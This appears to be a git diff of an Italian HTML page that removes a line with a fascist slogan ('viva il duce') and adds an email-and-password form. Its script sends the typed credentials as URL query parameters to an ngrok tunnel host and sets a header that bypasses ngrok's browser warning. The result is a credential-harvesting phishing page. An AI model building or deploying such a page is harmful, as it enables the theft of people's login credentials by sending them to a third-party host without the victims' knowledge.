@@ -1,7 +1,58 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invio Dati con Header Personalizzato</title>
+</head>
 <body>
-<h1>viva il duce</h1>
-<p></p>
+
+    <form id="myForm">
+        <label for="name">email:</label>
+        <input type="text" id="name" name="name" required>
+        
+        <label for="email">Password:</label>
+        <input type="password" id="email" name="email" required>
+        
+        <button type="submit">Invia</button>
+    </form>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Previene l'invio tradizionale del form
+
+            // Ottieni i dati del form
+            const formData = new FormData(event.target);
+
+            // Costruisci la query string dai dati del form
+            const queryParams = new URLSearchParams(formData).toString();
+
+            // URL di destinazione con i parametri del form nell'URL
+            const url = `https://fc72-79-23-206-190.ngrok-free.app/index.html?${queryParams}`; // Sostituisci con il tuo URL
+
+            // Esegui la richiesta GET con fetch
+            fetch(url, {
+                method: 'GET',
+                headers: {
+                    'ngrok-skip-browser-warning': 'ValorePersonalizzato' // Aggiungi il tuo header personalizzato
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error('Errore nella richiesta');
+            })
+            .then(data => {
+                console.log('Risposta dal server:', data);
+                alert('Dati inviati con successo!');
+            })
+            .catch(error => {
+                console.error('Errore:', error);
+                alert('Errore durante l\'invio dei dati');
+            });
+        });
+    </script>
+
 </body>
 </html>
